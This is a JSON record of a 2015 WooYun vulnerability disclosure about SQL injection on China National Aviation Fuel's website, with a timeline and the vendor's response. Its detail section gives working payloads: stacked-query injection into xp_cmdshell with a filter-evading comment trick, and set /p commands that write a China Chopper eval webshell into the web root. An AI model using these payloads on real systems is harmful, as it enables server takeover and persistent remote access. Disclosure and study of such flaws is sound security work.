{"id": 69852, "wybug_id": "wooyun-2015-0135564", "wybug_title": "中国航空油料集团主站注入+getshell(无视web防御)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Msyb", "wybug_date": "2015-08-26 11:08", "wybug_open_date": "2015-10-13 09:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-29：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-13：\t细节向公众公开  简要描述：    中国航空油料集团公司是以原中国航空油料总公司为基础组建的国有大型航空运输服务保障企业，是国内最大的集航空油品采购、运输、储存、检测、销售、加注为一体的航油供应商，国务院授权的投资机构和国家控股公司试点企业，国务院国资委管理的中央企业。　　中国航油控股、参股20个海内外企业，构建了遍布全国的航油、成品油销售网络和完备的油品物流配送体系，在全国190 多个机场拥有供油设施，为全球200 多家航空客户提供航油加注服务，在25个省、市、自治区为民航及社会车辆提供汽柴油及石化产品的批发、零售、仓储及配送服务，在长三角、珠三角、环渤海湾和西南地区建有大型成品油及石化产品的物流储运基地。　　中国航油已成为亚洲第一大航油供应商。2015年7月，以2014年营业收入2229亿元荣登《财富》世界500 强第321位。中国航油2011年首次入榜，连续第五年榜上有名，历年排名为431, 318, 277, 314和321。 详细说明：  注入点:http://**.**.**.**/jiayou/changepwd.aspxpost注入data:__VIEWSTATE=%2FwEPDwULLTE2MzM3NTU1MDBkZF%2BhzShW4b%2FxFbARD41NUcd6YZ0o&__VIEWSTATEGENERATOR=23AEA91D&__EVENTVALIDATION=%2FwEWBgKIv5X9DgKvpuq2CALGmdGVDALZwZWBCALZwcHzAwKM54rGBoqLKXWTNcTC8oaPl8trcXPQKtKN&username=admin&pwd=111111&new=111111&new1=111111&Button1=%E7%A1%AE+%E8%AE%A4参数username为过滤\n\n于是慢慢把管理员账号密码搞了出来\n\n\n\n用户名admin,密码看图。后台在http://**.**.**.**/console/login.aspx然而经过一番尝试，没拿到shell。于是又回到注入点，发现可以执行命令username=admin' ;--%0aexec--%0amaster.dbo.xp_cmdshell '命令'直接exec会被拦截，然而并没有什么用在后台系统设置，系统信息检测那里给出了网站物理路径为D:\\cnaf\\\n\n于是直接用xp_cmdshell写shell\nset /p=\"<%@ Page Language=\" >>D:\\cnaf\\x.aspxset /p=^\" >>D:\\cnaf\\x.aspxset /p=\"Jscrip\" >>D:\\cnaf\\x.aspxset /p=\"t\" >>D:\\cnaf\\x.aspxset /p=^\" >>D:\\cnaf\\x.aspxset /p=\"%><%eval(Request.Item[\"chopper\"],\"unsafe\");%>\" >>D:\\cnaf\\x.aspx\n 一句一句的放在--%0aexec--%0amaster.dbo.xp_cmdshell '里面'执行。这里的关键是script会被拦截，所以直接echo不行，而且echo会强制换行，网上查半天也没搞定这个问题，最后才看到用set的方法。然后拿到shell,http://**.**.**.**/x.aspx密码chopper预览时我发现乌云把一个“\\”变成两个\\了，无语。\n\n还有在我这台电脑上%必须改成%%才能输出，但注入那里好像就不用，不解反正拿到shell了，有图为证！\n\n   漏洞证明：  \n\n\n\nhttp://**.**.**.**/x.aspx密码chopper\n\n   修复方案：  加强防御   版权声明：转载请注明来源 Msyb@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-29 09:33 厂商回复： CNVD确认并复现所述情况,转由CNCERT向民航行业测评中心通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-31 17:40 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:483 漏洞数:117        | 茶凉了，就不要再续了，再续也不是原来的味...)\t\t \n  66666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}